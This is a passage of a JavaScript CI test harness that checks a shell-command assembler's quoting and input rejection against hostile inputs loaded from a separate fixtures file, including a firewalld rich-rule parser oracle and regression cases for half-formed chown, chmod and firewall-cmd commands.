#!/usr/bin/env node
/* hostile_harness.js — CI merge-gate #4 (threat-model-v1 §11 item 4, §12 item 1).
 *
 *   node tests/hostile_harness.js [path/to/template.html|dist/md-code-red_*.html] [--json]
 *
 * Lifts the MCR-ASSEMBLER block verbatim out of the given file and runs every
 * vector in tests/fixtures/hostile-inputs.json against every field type, in
 * both --flag=VALUE and positional shapes, on all four RHEL releases, plus the
 * composed firewalld rich-rule path and the version-gating path.
 *
 * The code under test is the shipped code: qa.py Q18 points this harness at the
 * built artifact, so a difference between template.html and dist/ cannot hide
 * here. Nothing is stubbed, re-implemented, or paraphrased in Python — there is
 * one assembler in this repo and this runs it.
 *
 * Every (field type, vector) pair must land in exactly one of two states:
 *   REJECTED     assembleCommand() returned null.
 *   QUOTED-SAFE  the value occurs in the command only inside single quotes, the
 *                unquoted skeleton equals the benign command's skeleton, and
 *                the unquoted remainder holds no shell metacharacter.
 * Anything else is a FAIL and exits non-zero.
 *
 * The harness never executes /bin/sh against a vector: proving the quoting by
 * running it would execute attacker text on precisely the build where the
 * quoting is broken. It tokenises instead, under POSIX single-quote rules.
 */
"use strict";

var fs = require("fs");
var path = require("path");

var REPO = path.resolve(__dirname, "..");
var BEGIN = "MCR-ASSEMBLER-BEGIN";
var END = "MCR-ASSEMBLER-END";
var VERSIONS = ["7", "8", "9", "10"];

/* ---------------------------------------------------------------- extraction */

function extractAssembler(file) {
  var src = fs.readFileSync(file, "utf8");
  var a = src.indexOf(BEGIN);
  if (a < 0) throw new Error("no " + BEGIN + " marker in " + file);
  /* Both markers live inside block comments, so the code is what lies between
     the end of the opening comment and the start of the closing one. The END
     marker is searched for AFTER the opening comment closes, because that
     comment's own prose names it. */
  var from = src.indexOf("*/", a);
  if (from < 0) throw new Error("the " + BEGIN + " comment is unterminated in " + file);
  from += 2;
  var b = src.indexOf(END, from);
  if (b < 0) throw new Error("no " + END + " marker after " + BEGIN + " in " + file);
  var to = src.lastIndexOf("/*", b);
  if (to < from) throw new Error("malformed assembler markers in " + file);
  var block = src.slice(from, to);
  /* The block must stay pure. If a DOM or data-island reference ever lands in
     it, this harness would either crash or, worse, quietly test a stub. */
  var banned = ["document", "window.", "localStorage", "sessionStorage",
                "DATASETS", "STATE.", "innerHTML"];
  for (var i = 0; i < banned.length; i++) {
    if (block.indexOf(banned[i]) >= 0) {
      throw new Error("assembler block references '" + banned[i] +
                      "' — it must stay pure, or this gate tests nothing");
    }
  }
  /* MCR-SEC-010. The dead YAML quoter is gone and Q18's quoting-domain check is
     shell-only until the Ansible generator lands. If a YAML sink brings a quoter
     back, its oracle ships in the same commit as the sink — this harness refuses
     to run otherwise, rather than proving shell containment and calling it YAML
     containment (that mistake is MCR-SEC-005b). */
  if (block.indexOf("yamlQuote") >= 0 && block.indexOf("PARSE_YAML_ORACLE") < 0) {
    throw new Error("a YAML quoter is back in the assembler block with no YAML oracle in this " +
                    "harness. MCR-SEC-010: the sink, the quoter and a YAML-parsing oracle ship " +
                    "together or not at all");
  }
  var factory = new Function(
    "\"use strict\";\n" + block + "\n" +
    "return {shQuote:shQuote,validateField:validateField," +
    "validateSpec:validateSpec,assembleCommand:assembleCommand," +
    "composeRichRule:composeRichRule,blastFor:blastFor,FIELD_TYPES:FIELD_TYPES," +
    "RICHRULE_SLOT_TYPES:RICHRULE_SLOT_TYPES,fieldTypeMap:fieldTypeMap," +
    "headerSafe:headerSafe,commentPayload:commentPayload," +
    "assemblePipeline:assemblePipeline,PIPE_OPERATORS:PIPE_OPERATORS," +
    "PIPE_OPERATOR_KEYS:PIPE_OPERATOR_KEYS,PIPE_OPERATOR_EMITS:PIPE_OPERATOR_EMITS," +
    "MAX_PIPELINE_STAGES:MAX_PIPELINE_STAGES,commandWords:commandWords," +
    "isComposableSpec:isComposableSpec,validatePipeline:validatePipeline," +
    "redirectTargetBlast:redirectTargetBlast,isExecutionSink:isExecutionSink," +
    "stageRefused:stageRefused};");
  return { api: factory(), bytes: block.length };
}

/* --------------------------------------------------------------- tokenising */

/* A POSIX-ish word splitter, which is what a shell would do with this string.
   Single quotes protect everything until the next quote; outside them a
   backslash escapes exactly one character (shQuote's embedded-quote idiom
   'a'\''b' is one word: quoted, escaped-quote, quoted). Each word records the
   text a shell would still interpret — the part NOT protected by quotes and
   NOT backslash-escaped — which is the only text an injected value could ever
   act through. */
function tokenize(cmd) {
  var words = [], cur = "", bare = "", deq = "", quoted = false, started = false, inQ = false, i = 0;
  function flush() {
    if (started) words.push({ raw: cur, bare: bare, deq: deq, quoted: quoted });
    cur = ""; bare = ""; deq = ""; quoted = false; started = false;
  }
  while (i < cmd.length) {
    var c = cmd.charAt(i);
    if (inQ) {
      cur += c;
      if (c === "'") inQ = false; else deq += c;
      i++; started = true; continue;
    }
    if (c === "\\") {
      if (i + 1 >= cmd.length) return null;      /* trailing backslash: malformed */
      cur += c + cmd.charAt(i + 1);
      deq += cmd.charAt(i + 1);
      i += 2; started = true; continue;          /* escaped char is inert, not 'bare' */
    }
    if (c === "'") { inQ = true; quoted = true; cur += c; i++; started = true; continue; }
    if (c === " " || c === "\t") { flush(); i++; continue; }
    if (c === "\n" || c === "\r") return null;   /* a raw newline is never legitimate here */
    cur += c; bare += c; deq += c; i++; started = true;
  }
  if (inQ) return null;                          /* unbalanced quote: quoting is broken */
  flush();
  return words;
}

/* ------------------------------------------------- the rich-rule oracle -----
 * MCR-SEC-005(b). tokenize()/skeleton() prove SHELL-token containment and
 * nothing else: a value can sit perfectly inside one single-quoted shell word
 * and still rewrite the grammar of whatever consumes that word. firewalld's
 * rich-rule language is that consumer, so it gets its own parser here.
 *
 * parseRichRule() is deliberately strict — every token is either an element
 * name or a key="value" attribute with no quote inside the value. Anything else
 * is injected syntax and returns null rather than being tolerated.
 */
function parseRichRule(s) {
  var toks = String(s).split(" ");
  if (toks.length < 2 || toks[0] !== "rule") return null;
  var els = [{ name: "rule", attrs: [] }], action = null, i;
  for (i = 1; i < toks.length; i++) {
    var t = toks[i];
    if (/^[a-z][a-z0-9-]*$/.test(t)) {
      if (i === toks.length - 1) { action = t; break; }
      els.push({ name: t, attrs: [] });
      continue;
    }
    var m = /^([a-z][a-z0-9-]*)="([^"\s]*)"$/.exec(t);
    if (!m) return null;
    els[els.length - 1].attrs.push([m[1], m[2]]);
  }
  if (action === null) return null;
  return { elements: els, action: action };
}

/* What the OPERATOR asked for, derived from the plan and the values they chose —
 * the intent the composed rule must equal, element for element, in order. */
function intendedRichRule(plan, values) {
  var els = [{ name: "rule", attrs: [["family", values[plan.family]]] }];
  if (plan.source && values[plan.source] !== undefined) {
    els.push({ name: "source", attrs: [["address", values[plan.source]]] });
  }
  if (plan.destination && values[plan.destination] !== undefined) {
    els.push({ name: "destination", attrs: [["address", values[plan.destination]]] });
  }
  if (plan.service && values[plan.service] !== undefined) {
    els.push({ name: "service", attrs: [["name", values[plan.service]]] });
  }
  if (plan.port && values[plan.port] !== undefined) {
    els.push({ name: "port", attrs: [["port", values[plan.port]], ["protocol", values[plan.protocol]]] });
  }
  return { elements: els, action: values[plan.action] };
}

function describeRule(r) {
  var out = [], i, j;
  for (i = 0; i < r.elements.length; i++) {
    var e = r.elements[i], bits = [];
    for (j = 0; j < e.attrs.length; j++) bits.push(e.attrs[j][0] + "=" + e.attrs[j][1]);
    out.push(e.name + "(" + bits.join(",") + ")");
  }
  return out.join(" ") + " -> " + r.action;
}

/* The oracle proper: lift the composed rule back out of the assembled command,
 * parse it, and assert the element count, the element order, every attribute and
 * the ACTION are exactly the operator's intent. An injected `accept` clause or a
 * `log` element changes the count; a swapped action changes the action. */
function richRuleOracle(command, plan, values) {
  var words = tokenize(command);
  if (words === null) return "the command does not tokenise as balanced shell words";
  var payload = null, i;
  for (i = 0; i < words.length; i++) {
    if (words[i].deq.indexOf("--add-rich-rule=") === 0) {
      payload = words[i].deq.slice("--add-rich-rule=".length);
    }
  }
  if (payload === null) return "no --add-rich-rule= token in the assembled command";
  var got = parseRichRule(payload);
  if (got === null) return "the composed rich rule does not parse as rich-rule syntax: " + JSON.stringify(payload);
  var want = intendedRichRule(plan, values);
  if (got.elements.length !== want.elements.length) {
    return "rich-rule element count " + got.elements.length + " != the operator's " +
           want.elements.length + " — " + describeRule(got) + " vs " + describeRule(want);
  }
  for (i = 0; i < want.elements.length; i++) {
    var g = got.elements[i], w = want.elements[i];
    if (g.name !== w.name) {
      return "rich-rule element " + i + " is '" + g.name + "', the operator's is '" + w.name + "'";
    }
    if (g.attrs.length !== w.attrs.length) {
      return "rich-rule element '" + g.name + "' carries " + g.attrs.length + " attributes, the " +
             "operator's carries " + w.attrs.length + " — " + describeRule(got);
    }
    for (var j = 0; j < w.attrs.length; j++) {
      if (g.attrs[j][0] !== w.attrs[j][0] || g.attrs[j][1] !== String(w.attrs[j][1])) {
        return "rich-rule attribute " + g.attrs[j][0] + "=" + g.attrs[j][1] + " != the operator's " +
               w.attrs[j][0] + "=" + w.attrs[j][1];
      }
    }
  }
  if (got.action !== String(want.action)) {
    return "rich-rule ACTION is '" + got.action + "' but the operator selected '" + want.action +
           "' — the rule installed on the host would not be the rule on screen";
  }
  return null;
}

/* The shape a shell sees: every quoted payload collapses to one placeholder, so
   two commands that differ only INSIDE quotes compare equal, and any value that
   changed the command's structure shows up immediately. */
function skeleton(words) {
  var out = [];
  for (var i = 0; i < words.length; i++) {
    out.push(words[i].quoted ? words[i].bare + "@" : words[i].raw);
  }
  return out.join(" ");
}

function bareText(words) {
  var out = "";
  for (var i = 0; i < words.length; i++) out += words[i].bare + " ";
  return out;
}

var UNQUOTED_OK = /^[A-Za-z0-9_./=:@%+,\- ]*$/;

/* ---------------------------------------------- the VALIDITY oracle --------
 * MCR-SEC-021 / MCR-SEC-015, conditions E1 and E6. Everything above this point
 * is a CONTAINMENT oracle: it proves a hostile value cannot escape its single
 * quotes and cannot change the command's shell-visible shape. It says nothing
 * about whether the shape itself is a legal invocation of the tool — which is
 * precisely how 20 short-option tokens joined with '=' passed 76,225 checks.
 *
 * optionSyntaxErrors() is the general half of the missing oracle: getopt(3)
 * syntax, asserted on every benign command this harness assembles. The specific
 * half is tests/fixtures/golden-commands.json, which states the exact command
 * every generator must emit.
 *
 *   short option (single dash):  -X value   or  -Xvalue   — NEVER -X=value,
 *       because getopt() hands the '=' to the program as optarg[0].
 *   long option  (double dash):  --name=value  or  --name value  — both legal;
 *       this product emits the '=' form, and E1 must not "fix" it away.
 */
var SHORT_OPT_EQ_RE = /^-[A-Za-z0-9][A-Za-z0-9-]*=/;
var LONG_OPT_RE = /^--[A-Za-z0-9][A-Za-z0-9-]*(=|$)/;
var SHORT_OPT_RE = /^-[A-Za-z0-9][A-Za-z0-9-]*$/;

function optionSyntaxErrors(command) {
  var errs = [];
  var words = tokenize(command);
  if (words === null) {
    return ["does not tokenise as balanced shell words"];
  }
  for (var i = 0; i < words.length; i++) {
    var bare = words[i].bare;
    if (bare.charAt(0) !== "-" || bare.length < 2) continue;   /* not option-shaped */
    if (bare === "--") continue;                               /* end-of-options marker */
    if (bare.charAt(1) === "-") {
      if (!LONG_OPT_RE.test(bare)) {
        errs.push("word " + i + " " + JSON.stringify(words[i].raw) +
                  " is double-dashed but is not a long option");
      }
      continue;
    }
    if (SHORT_OPT_EQ_RE.test(bare)) {
      errs.push("word " + i + " " + JSON.stringify(words[i].raw) + " joins a SHORT option to its " +
                "value with '='. getopt(3) passes the '=' through as the first character of the " +
                "argument, so the tool receives a value that is not the one on screen " +
                "(MCR-SEC-015). A short option takes '-X value' or glued '-Xvalue'");
      continue;
    }
    if (!SHORT_OPT_RE.test(bare)) {
      errs.push("word " + i + " " + JSON.stringify(words[i].raw) +
                " is single-dashed but is not a short option token");
    }
  }
  return errs;
}

/* The long options a spec's template binds to a value. E1 removes the '='
   join from SHORT options only; if it also removed it from long ones, every
   firewall-cmd and journalctl generator would still assemble and every
   containment check would still pass. These flags are what proves it did not. */
function longValueFlags(spec) {
  var out = [], t = (spec && spec.template) || [];
  for (var i = 0; i < t.length; i++) {
    var tok = t[i];
    if (!tok || typeof tok.flag !== "string") continue;
    if (tok.flag.indexOf("--") !== 0) continue;
    if (tok.field === undefined && tok.richRule === undefined) continue;   /* bare option */
    if (tok.eq === false) continue;                                        /* declared space-joined */
    out.push(tok.flag);
  }
  return out;
}

/* ------------------------------------------------------------------- specs */

function flagSpec(type, def, versions) {
  var field = { name: "v", type: type, required: true, versions: versions || VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-flag-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { flag: "--value", field: "v" }]
  };
}
function argSpec(type, def, versions) {
  var field = { name: "v", type: type, required: true, versions: versions || VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-arg-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { lit: "--" }, { field: "v" }]
  };
}
function spacedFlagSpec(type, def) {
  var field = { name: "v", type: type, required: true, versions: VERSIONS };
  if (def.options) field.options = def.options;
  return {
    id: "harness-spaced-" + type, tool: "harness", blast: "green",
    fields: [field],
    template: [{ lit: "probe" }, { flag: "--value", eq: false, field: "v" }]
  };
}
/* The highest-risk field class in the threat model: a rich rule whose legitimate
   syntax overlaps shell syntax. Composed from validated sub-fields only.
 *
 * MCR-SEC-005(a). (hostileField, hostileType) substitutes a DIFFERENT field type
 * into one rich-rule slot. Before the fix this function was only ever called as
 * richRuleSpec(null, null), so the substitution never fired and no free-text type
 * was ever placed in a rich-rule slot — which is precisely why MCR-SEC-001
 * survived 15,392 checks. It is now driven with every field type in every slot.
 *
 * `shape` picks the plan: "port" is the port/protocol rule, "service" is the
 * shape from the MCR-SEC-001 reproduction, where a `service` slot fed from a
 * comment-typed field injected a whole `accept` clause.
 */
function richRuleSpec(hostileField, hostileType, defs, shape) {
  var fields, plan;
  if (shape === "service") {
    fields = [
      { name: "family", type: "family", required: true, versions: VERSIONS },
      { name: "source", type: "cidr", required: true, versions: VERSIONS },
      { name: "svc", type: "service", required: true, versions: VERSIONS },
      { name: "act", type: "action", required: true, versions: VERSIONS }
    ];
    plan = { family: "family", source: "source", service: "svc", action: "act" };
  } else {
    fields = [
      { name: "family", type: "family", required: true, versions: VERSIONS },
      { name: "source", type: "cidr", required: true, versions: VERSIONS },
      { name: "port", type: "portrange", required: true, versions: VERSIONS },
      { name: "proto", type: "protocol", required: true, versions: VERSIONS },
      { name: "act", type: "action", required: true, versions: VERSIONS }
    ];
    plan = { family: "family", source: "source", port: "port", protocol: "proto", action: "act" };
  }
  for (var i = 0; i < fields.length; i++) {
    if (fields[i].name === hostileField && hostileType) {
      fields[i].type = hostileType;
      var d = (defs || {})[hostileType] || {};
      if (d.options) fields[i].options = d.options;
      else delete fields[i].options;
    }
  }
  var spec = {
    id: "harness-richrule" + (shape === "service" ? "-service" : ""),
    tool: "firewall-cmd", blast: "green",
    fields: fields,
    template: [
      { lit: "firewall-cmd" },
      { flag: "--add-rich-rule", richRule: plan },
      { lit: "--permanent" }
    ]
  };
  spec._plan = plan;
  return spec;
}

/* The benign value set for each rich-rule shape, per slot field name. */
function richBaseFor(shape) {
  return shape === "service"
    ? { family: "ipv4", source: "10.0.0.0/8", svc: "ssh", act: "accept" }
    : { family: "ipv4", source: "10.0.0.0/8", port: "8443", proto: "tcp", act: "accept" };
}

/* -------------------------------------------------------------------- run */

function main() {
  var target = process.argv[2] || path.join(REPO, "template.html");
  var asJson = process.argv.indexOf("--json") >= 0;
  var loaded = extractAssembler(target);
  var A = loaded.api;
  var fx = JSON.parse(fs.readFileSync(path.join(REPO, "tests", "fixtures", "hostile-inputs.json"), "utf8"));
  var types = Object.keys(fx.field_types);
  var vectors = fx.vectors;

  var stats = { checks: 0, rejected: 0, quoted: 0, oracles: 0, failures: [], byClass: {}, byType: {} };

  function note(cls, outcome) {
    if (!stats.byClass[cls]) stats.byClass[cls] = { rejected: 0, quoted: 0 };
    stats.byClass[cls][outcome]++;
  }

  function check(label, cls, spec, version, values, value, expect) {
    stats.checks++;
    var res;
    try {
      res = A.assembleCommand(spec, version, values, { patterns: [] });
    } catch (e) {
      stats.failures.push(label + ": assembler threw " + e.message);
      return;
    }
    if (res === null) {
      if (expect !== "reject") {
        stats.failures.push(label + ": rejected, but this value is legitimate for this field type " +
                            "and must assemble into a quoted token");
        return;
      }
      stats.rejected++; note(cls, "rejected"); return;
    }
    if (expect === "reject") {
      stats.failures.push(label + ": accepted a value its field type's allow-list must refuse — " +
                          JSON.stringify(res.command) + " (quoting may still hold; the grammar does not)");
      return;
    }
    if (!res || typeof res.command !== "string") {
      stats.failures.push(label + ": returned a non-null result with no command string");
      return;
    }
    var words = tokenize(res.command);
    if (words === null) {
      stats.failures.push(label + ": command does not tokenise as balanced shell words — "
        + JSON.stringify(res.command));
      return;
    }
    /* nothing the shell would still interpret may carry any of the value */
    var bare = bareText(words);
    if (!UNQUOTED_OK.test(bare)) {
      stats.failures.push(label + ": shell metacharacter left unquoted in "
        + JSON.stringify(bare) + " (from " + JSON.stringify(res.command) + ")");
      return;
    }
    if (value !== "" && bare.indexOf(value) >= 0) {
      stats.failures.push(label + ": the value itself reached unquoted text in " + JSON.stringify(res.command));
      return;
    }
    /* the command's shape must be exactly what the benign control produces */
    var benignValues = {}, k;
    for (k in values) if (Object.prototype.hasOwnProperty.call(values, k)) benignValues[k] = values[k];
    benignValues[spec._hostileField] = spec._benign;
    var ref = A.assembleCommand(spec, version, benignValues, { patterns: [] });
    if (ref === null) {
      stats.failures.push(label + ": the benign control value was itself rejected");
      return;
    }
    var refWords = tokenize(ref.command);
    if (refWords === null || skeleton(words) !== skeleton(refWords)) {
      stats.failures.push(label + ": shell-visible shape differs from the benign control — "
        + JSON.stringify(skeleton(words)) + " vs "
        + JSON.stringify(refWords ? skeleton(refWords) : "(control does not tokenise)"));
      return;
    }
    /* MCR-SEC-005(b): shell containment is not rich-rule containment. If this
       spec composes a rich rule, the rule itself gets parsed and compared. */
    if (spec._plan) {
      var oracleMsg = richRuleOracle(res.command, spec._plan, values);
      if (oracleMsg) {
        stats.failures.push(label + ": rich-rule oracle — " + oracleMsg);
        return;
      }
      stats.oracles++;
    }
    stats.quoted++;
    note(cls, "quoted");
  }

  /* ---- every field type x every vector x every version x three shapes ---- */
  for (var t = 0; t < types.length; t++) {
    var type = types[t];
    var def = fx.field_types[type];
    stats.byType[type] = { rejected: 0, quoted: 0 };
    for (var v = 0; v < vectors.length; v++) {
      var vec = vectors[v];
      for (var r = 0; r < VERSIONS.length; r++) {
        var version = VERSIONS[r];
        var shapes = [flagSpec(type, def), argSpec(type, def), spacedFlagSpec(type, def)];
        for (var s = 0; s < shapes.length; s++) {
          var spec = shapes[s];
          spec._hostileField = "v";
          spec._benign = def.benign;
          var before = { r: stats.rejected, q: stats.quoted };
          /* every field type except the one free-text type is a closed grammar,
             so the required outcome there is rejection, full stop. */
          check(spec.id + " / " + vec.id + " / RHEL " + version, vec["class"],
                spec, version, { v: vec.value }, vec.value,
                type === "comment" ? vec.free_text : "reject");
          if (stats.rejected > before.r) stats.byType[type].rejected++;
          else if (stats.quoted > before.q) stats.byType[type].quoted++;
        }
      }
    }
  }

  /* ---- the rich-rule path (MCR-SEC-001 / MCR-SEC-005) --------------------
     Three sweeps, because two different things can go wrong here: a hostile
     VALUE in a legitimate sub-field type, and a hostile TYPE substituted into a
     rich-rule slot by a content author. The second one is what MCR-SEC-001 was:
     the slot allow-list is now the control, and this is the sweep that proves it.
   */
  var RICH_SHAPES = ["port", "service"];
  var richCounts = { native: 0, typed: 0, refusedType: 0, allowedType: 0 };

  function slotOfField(plan, fieldName) {
    for (var s in plan) {
      if (Object.prototype.hasOwnProperty.call(plan, s) && plan[s] === fieldName) return s;
    }
    return null;
  }
  function valuesFrom(base, override, value) {
    var out = {}, k;
    for (k in base) if (Object.prototype.hasOwnProperty.call(base, k)) out[k] = base[k];
    if (override) out[override] = value;
    return out;
  }

  for (var sh = 0; sh < RICH_SHAPES.length; sh++) {
    var shape = RICH_SHAPES[sh];
    var richBase = richBaseFor(shape);
    var richFields = Object.keys(richBase);

    /* (1) native sub-field types, hostile values: every rich-rule sub-field is a
           closed grammar, so nothing hostile may compose. */
    for (var rf = 0; rf < richFields.length; rf++) {
      for (var rv = 0; rv < vectors.length; rv++) {
        for (var rr = 0; rr < VERSIONS.length; rr++) {
          var rspec = richRuleSpec(null, null, fx.field_types, shape);
          rspec._hostileField = richFields[rf];
          rspec._benign = richBase[richFields[rf]];
          richCounts.native++;
          check("richrule-" + shape + "[" + richFields[rf] + "] / " + vectors[rv].id +
                " / RHEL " + VERSIONS[rr], vectors[rv]["class"], rspec, VERSIONS[rr],
                valuesFrom(richBase, richFields[rf], vectors[rv].value), vectors[rv].value, "reject");
        }
      }
    }

    /* (2) hostile TYPE substituted into each slot, benign value for that type.
           A type that is not on the slot's allow-list must yield null even with a
           perfectly valid value — that is the structural rule, not a character
           rule. A type that IS allow-listed must still compose the operator's
           exact rule, which the oracle checks. */
    for (var tf = 0; tf < richFields.length; tf++) {
      var slot = slotOfField(richRuleSpec(null, null, fx.field_types, shape)._plan, richFields[tf]);
      for (var tt = 0; tt < types.length; tt++) {
        var subType = types[tt];
        var allowed = (A.RICHRULE_SLOT_TYPES[slot] || []).indexOf(subType) >= 0;
        for (var tr = 0; tr < VERSIONS.length; tr++) {
          var tspec = richRuleSpec(richFields[tf], subType, fx.field_types, shape);
          var tvals = valuesFrom(richBase, richFields[tf], fx.field_types[subType].benign);
          var label = "richrule-" + shape + "[" + slot + " := " + subType + "] / RHEL " + VERSIONS[tr];
          stats.checks++;
          richCounts.typed++;
          var tres = A.assembleCommand(tspec, VERSIONS[tr], tvals, { patterns: [] });
          if (!allowed) {
            if (tres !== null) {
              stats.failures.push(label + ": a field type that is NOT on this rich-rule slot's " +
                                  "allow-list composed a rule — " + JSON.stringify(tres.command));
            } else {
              stats.rejected++; note("rich-rule slot type", "rejected");
              richCounts.refusedType++;
            }
            continue;
          }
          if (tres === null) {
            stats.failures.push(label + ": an allow-listed closed-grammar type was refused with a " +
                                "benign value — the slot allow-list is too narrow to be usable");
            continue;
          }
          var msg = richRuleOracle(tres.command, tspec._plan, tvals);
          if (msg) {
            stats.failures.push(label + ": rich-rule oracle — " + msg);
            continue;
          }
          stats.quoted++; stats.oracles++; note("rich-rule slot type", "quoted");
          richCounts.allowedType++;
        }
      }
    }

    /* (3) hostile TYPE and hostile VALUE together: the cross product the
           signature was written for. Every case must be refused — either
           structurally (type not allowed in the slot) or by the type's own
           allow-list (every allowed type is a closed grammar). */
    for (var hf = 0; hf < richFields.length; hf++) {
      for (var ht = 0; ht < types.length; ht++) {
        for (var hv = 0; hv < vectors.length; hv++) {
          for (var hr = 0; hr < VERSIONS.length; hr++) {
            var hspec = richRuleSpec(richFields[hf], types[ht], fx.field_types, shape);
            hspec._hostileField = richFields[hf];
            hspec._benign = richBase[richFields[hf]];
            check("richrule-" + shape + "[" + richFields[hf] + " := " + types[ht] + "] / " +
                  vectors[hv].id + " / RHEL " + VERSIONS[hr], vectors[hv]["class"], hspec,
                  VERSIONS[hr], valuesFrom(richBase, richFields[hf], vectors[hv].value),
                  vectors[hv].value, "reject");
          }
        }
      }
    }

    /* (4) benign control for the shape: the rule the operator asked for still
           composes, on every release, and the oracle agrees element for element. */
    for (var br = 0; br < VERSIONS.length; br++) {
      var bspec = richRuleSpec(null, null, fx.field_types, shape);
      stats.checks++;
      var bres = A.assembleCommand(bspec, VERSIONS[br], richBase, { patterns: [] });
      if (bres === null) {
        stats.failures.push("richrule-" + shape + " benign control was rejected on RHEL " + VERSIONS[br]);
        continue;
      }
      var bmsg = richRuleOracle(bres.command, bspec._plan, richBase);
      if (bmsg) {
        stats.failures.push("richrule-" + shape + " benign control / RHEL " + VERSIONS[br] +
                            ": rich-rule oracle — " + bmsg);
        continue;
      }
      stats.quoted++; stats.oracles++; note("rich-rule benign control", "quoted");
    }
  }

  /* ---- MCR-SEC-002: never-half-formed, per TEMPLATE ----------------------
     The rule used to be enforced per FIELD: an optional field that was not
     supplied simply made its token vanish, so a positional argument could shift
     into the slot before it (`chown 'apache' '/var/www'` -> `chown '/var/www'`)
     and a literal that owned a value could be left dangling
     (`--add-forward-port=port=443:proto=tcp:toaddr=` with nothing after it).
     Both reproductions below are Marcus's, kept verbatim as regressions.

     Every template shape gets the absent-optional case, on all four releases:
     positional, trailing positional, --flag=value, --flag value, lit-then-field,
     lit-with-requires, and the version-gated variants of each. `want` is either
     null or the exact command the template must produce. */
  var halfFormed = 0;
  function hfCase(id, spec, values, want) {
    return { id: id, spec: spec, values: values, want: want };
  }
  var F_OWNER = { name: "owner", type: "username", required: false };
  var F_PATH = { name: "p", type: "path", required: true };
  var F_ZONE = { name: "zone", type: "zone", required: true };
  var F_TOADDR = { name: "toaddr", type: "ipv4", required: false };
  var F_MODE = { name: "mode", type: "integer", required: false };
  var FWD_LIT = "--add-forward-port=port=443:proto=tcp:toaddr=";

  var hfCases = [
    /* (a) Marcus's positional-shift reproduction */
    hfCase("chown / optional positional, not declared droppable, value absent",
      { id: "hf-chown", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner" }, { field: "p" }] },
      { p: "/var/www" }, null),
    hfCase("chown / both positionals supplied (control)",
      { id: "hf-chown", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner" }, { field: "p" }] },
      { owner: "apache", p: "/var/www" }, "chown 'apache' '/var/www'"),
    hfCase("chown / declared droppable but a later positional is present",
      { id: "hf-chown-declared", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "owner", optional: true }, { field: "p" }] },
      { p: "/var/www" }, null),
    hfCase("chown / declared droppable and trailing — the only legal drop",
      { id: "hf-chown-trailing", fields: [F_OWNER, F_PATH],
        template: [{ lit: "chown" }, { field: "p" }, { field: "owner", optional: true }] },
      { p: "/var/www" }, "chown '/var/www'"),

    /* (b) Marcus's dangling-option reproduction, named in threat-model §3.4 */
    hfCase("firewall-cmd / lit owns the value, value absent, nothing declared",
      { id: "hf-fwd", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT }, { field: "toaddr" }] },
      { zone: "public" }, null),
    hfCase("firewall-cmd / both supplied (control)",
      { id: "hf-fwd", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT }, { field: "toaddr" }] },
      { zone: "public", toaddr: "10.1.1.1" },
      "firewall-cmd --zone='public' " + FWD_LIT + " '10.1.1.1'"),
    hfCase("firewall-cmd / lit declares requires:, so it drops WITH its value",
      { id: "hf-fwd-requires", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT, requires: "toaddr" }, { field: "toaddr", optional: true }] },
      { zone: "public" }, "firewall-cmd --zone='public'"),
    hfCase("firewall-cmd / requires: lit keeps its value when supplied",
      { id: "hf-fwd-requires", fields: [F_ZONE, F_TOADDR],
        template: [{ lit: "firewall-cmd" }, { flag: "--zone", field: "zone" },
                   { lit: FWD_LIT, requires: "toaddr" }, { field: "toaddr", optional: true }] },
      { zone: "public", toaddr: "10.1.1.1" },
      "firewall-cmd --zone='public' " + FWD_LIT + " '10.1.1.1'"),
    hfCase("lit requires: a field the spec does not declare",
      { id: "hf-fwd-bad-requires", fields: [F_ZONE],
        template: [{ lit: "firewall-cmd" }, { lit: FWD_LIT, requires: "nosuch" }] },
      { zone: "public" }, null),

    /* (c) MCR-SEC-013, Marcus's re-review reproduction. A conditional POSITIONAL
       literal is the one path the MCR-SEC-002 rule did not cover: isPositional-
       Token() asked `tok.field && !tok.flag`, so a lit was never positional and
       could vanish with a later positional still present — `chmod '/etc/foo'`,
       the path sitting in the mode slot. The rule is the same one field tokens
       obey: drop only if every later positional drops too. */
    hfCase("chmod / conditional positional LIT drops while a later positional stays",
      { id: "hf-chmod-lit", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { lit: "0644", requires: "mode" }, { field: "p" }] },
      { p: "/etc/foo" }, null),
    hfCase("chmod / conditional positional LIT with its field supplied (control)",
      { id: "hf-chmod-lit", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { lit: "0644", requires: "mode" }, { field: "p" }] },
      { mode: "1", p: "/etc/foo" }, "chmod 0644 '/etc/foo'"),
    hfCase("chmod / conditional LIT is the last positional — the only legal drop",
      { id: "hf-chmod-lit-trailing", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { field: "p" }, { lit: "0644", requires: "mode" }] },
      { p: "/etc/foo" }, "chmod '/etc/foo'"),
    hfCase("chmod / conditional LIT last positional, field supplied (control)",
      { id: "hf-chmod-lit-trailing", fields: [F_MODE, F_PATH],
        template: [{ lit: "chmod" }, { field: "p" }, { lit: "0644", requires: "mode" }] },
      { mode: "1", p: "/etc/foo" }, "chmod '/etc/foo' 0644"),

    /* --flag=value and --flag value: name and value live in one token, so the
       drop takes both or neither — but it still has to be declared. */
    hfCase("--flag=value / optional value absent, not declared droppable",
      { id: "hf-flag", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", field: "owner" }] },
      {}, null),
    hfCase("--flag=value / optional value absent, declared droppable",
      { id: "hf-flag-declared", fields: [F_OWNER],
        template: [{ lit: "probe" }, { flag: "--owner", field: "owner", optional: true }] },
      {}, "probe"),
    hfCase("--flag value / optional value absent, declared droppable",
      { id: "hf-spaced-declared", fields: [F_OWNER],
